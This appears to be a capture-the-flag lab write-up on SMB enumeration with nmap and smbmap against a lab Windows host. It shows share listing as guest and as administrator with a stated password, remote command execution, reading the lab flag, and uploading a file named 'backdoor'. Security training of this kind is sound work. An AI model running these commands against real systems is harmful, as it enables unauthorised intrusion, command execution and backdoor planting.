# smbmap

# Enumeration

```
root@attackdefense:~# nmap 10.4.23.102
Starting Nmap 7.91 ( https://nmap.org ) at 2023-11-24 03:07 IST
Nmap scan report for 10.4.23.102
Host is up (0.010s latency).
Not shown: 992 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
Nmap done: 1 IP address (1 host up) scanned in 1.51 second
```

# smbprotocols

```
root@attackdefense:~# nmap -p445 --script smb-protocols 10.4.23.102
Starting Nmap 7.91 ( https://nmap.org ) at 2023-11-24 03:08 IST
Nmap scan report for 10.4.23.102
Host is up (0.0099s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2.02
|     2.10
|     3.00
|_    3.02

Nmap done: 1 IP address (1 host up) scanned in 6.51 seconds
```

# smbmap as guest

```
root@attackdefense:~# smbmap -u guest -p "" -d . -H 10.4.23.102
[+] Guest session       IP: 10.4.23.102:445 Name: 10.4.23.102                                       
        Disk                                                    Permissions Comment
    ----                                                    ----------- -------
    ADMIN$                                              NO ACCESS   Remote Admin
    C                                                   NO ACCESS   
    C$                                                  NO ACCESS   Default share
    D$                                                  NO ACCESS   Default share
    Documents                                           NO ACCESS   
    Downloads                                           NO ACCESS   
    IPC$                                                READ ONLY   Remote IPC
    print$                                              READ ONLY   Printer Drivers
```

# smbmap as admin

```
root@attackdefense:~# smbmap -u administrator -p smbserver_771 -d . -H 10.4.23.102
[+] IP: 10.4.23.102:445 Name: 10.4.23.102                                       
        Disk                                                    Permissions Comment
    ----                                                    ----------- -------
    ADMIN$                                              READ, WRITE Remote Admin
    C                                                   READ ONLY   
    C$                                                  READ, WRITE Default share
    D$                                                  READ, WRITE Default share
    Documents                                           READ ONLY   
    Downloads                                           READ ONLY   
    IPC$                                                READ ONLY   Remote IPC
    print$                                              READ, WRITE Printer Drivers
```

# smbmap as admin + run command

```
root@attackdefense:~# smbmap -u administrator -p smbserver_771 -d . -H 10.4.23.102 -x "ipconfig"
                                
Windows IP Configuration

Ethernet adapter Ethernet 3:

   Connection-specific DNS Suffix  . : ec2.internal
   Link-local IPv6 Address . . . . . : fe80::9cd6:ce88:c8d9:a121%22
   IPv4 Address. . . . . . . . . . . : 10.4.23.102
   Subnet Mask . . . . . . . . . . . : 255.255.240.0
   Default Gateway . . . . . . . . . : 10.4.16.1

Tunnel adapter isatap.ec2.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : ec2.internal
```

# smbmap as admin + list C drive

```
root@attackdefense:~# smbmap -u administrator -p smbserver_771 -d . -H 10.4.23.102 -r "C$"
[+] IP: 10.4.23.102:445 Name: 10.4.23.102                                       
        Disk                                                    Permissions Comment
    ----                                                    ----------- -------
    C$                                                  READ, WRITE 
    .\C$\*
    dr--r--r--                0 Sat Sep  5 13:26:00 2020    $Recycle.Bin
    fw--w--w--           398356 Wed Aug 12 10:47:41 2020    bootmgr
    fr--r--r--                1 Wed Aug 12 10:47:40 2020    BOOTNXT
    dr--r--r--                0 Wed Aug 12 10:47:41 2020    Documents and Settings
    fr--r--r--               32 Mon Dec 21 21:27:10 2020    flag.txt
    fr--r--r--       8589934592 Fri Nov 24 03:05:56 2023    pagefile.sys
    dr--r--r--                0 Wed Aug 12 10:49:32 2020    PerfLogs
    dw--w--w--                0 Wed Aug 12 10:49:32 2020    Program Files
    dr--r--r--                0 Sat Sep  5 14:35:45 2020    Program Files (x86)
    dr--r--r--                0 Sat Sep  5 14:35:45 2020    ProgramData
    dr--r--r--                0 Sat Sep  5 09:16:57 2020    System Volume Information
    dw--w--w--                0 Sat Dec 19 11:14:55 2020    Users
    dr--r--r--                0 Fri Nov 24 03:10:24 2023    Windows
```

Flag found 🙂

# smbmap as admin + exec to get flag

```
root@attackdefense:~# smbmap -u administrator -p smbserver_771 -d . -H 10.4.23.102 -x "type C:\flag.txt"
25f492dbef8453cdca69a173a75790f0
```

# smbmap as admin + upload file

```
root@attackdefense:~# smbmap -u administrator -p smbserver_771 -d . -H 10.4.23.102 --upload "/root/backdoor" "C$\backdoor"
```

# smbmap as admin + download file

```
root@attackdefense:~# smbmap -u administrator -p smbserver_771 -d . -H 10.4.23.102 --download "C$\flag.txt"
```
